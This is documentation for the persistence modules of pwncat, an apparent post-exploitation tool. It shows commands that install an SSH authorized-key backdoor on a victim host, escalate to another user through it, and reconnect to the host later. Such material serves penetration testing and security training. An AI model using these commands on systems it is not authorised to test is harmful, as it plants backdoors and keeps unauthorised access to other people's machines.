Persistence
===========

Persistence modules are implemented as sub-classes of the standard ``pwncat`` modules, and are placed
under the ``persist`` package. Persistence methods provide an abstract way to install and utilize various
persistence methods on the victim host.

An installed persistence method is tracked in the database, and can be utilized for escalation or
reconnecting to a disconnected victim depending on the persistence module itself.

Listing Installed Modules
-------------------------

The ``persist.gather`` module is used to gather the installed modules on the victim host. This module
is also used to remove persistence modules in bulk. To simply list all installed modules:

.. code-block:: bash

   (local) pwncat$ run persist.gather

You can also specify any arguments available to persistence modules in the call to ``run`` in order
to filter the results:

.. code-block:: bash

   (local) pwncat$ run persist.gather user=bob

Installing Persistence
----------------------

Persistence modules are installed by running the relevant module. For example, to install persistence
as the user ``bob`` with the ``persist.authorized_key`` module, you can do the following:

.. code-block:: bash

   (local) pwncat$ run persist.authorized_key user=bob backdoor_key=./backdoor_id_rsa

Removing Persistence
--------------------

To remove a persistence module, you simply pass the ``remove`` argument to the module. It's worth noting
that the module arguments must be identical to the installed module in order to successfully remove the
module. To simplify this, you can use the ``persist.gather`` module to locate and remove the module.

.. code-block:: bash

   # Remove the module by explicitly specifying all parameters
   (local) pwncat$ run persist.authorized_key remove user=bob backdoor_key=./backdoor_id_rsa
   # Remove the module by locating it with persist.gather and removing it
   (local) pwncat$ run persist.gather remove user=bob

Escalating Using Persistence
----------------------------

Escalation with installed persistence can be done by passing the ``escalate`` argument to the
persistence module. Alternatively, it is recommended to simply utilize the ``escalate.auto``
module which will automatically select appropriate persistence modules if available.

.. code-block:: bash

   # Escalate to bob via installed persistence
   (local) pwncat$ run persist.authorized_key escalate user=bob backdoor_key=./backdoor_id_rsa
   (local) pwncat$ run persist.gather escalate user=bob
   # Recommended method
   (local) pwncat$ run escalate.auto user=bob

Reconnecting to a Victim via Persistence
----------------------------------------

Remote persistence modules can be used to reconnect to a victim host. This is done with the ``connect``
command (or via the pwncat command line parameters). The ``reconnect`` protocol will achieve this:

.. code-block:: bash

   # Reconnect as the specified user.
   # Automatically select either an installed persistence method or prompt for ssh password
   pwncat user@192.168.1.1
   # Reconnect protocol explicitly
   pwncat reconnect://user@192.168.1.1
   # Reconnect with a specific module
   pwncat reconnect://user:persist.authorized_key@192.168.1.1
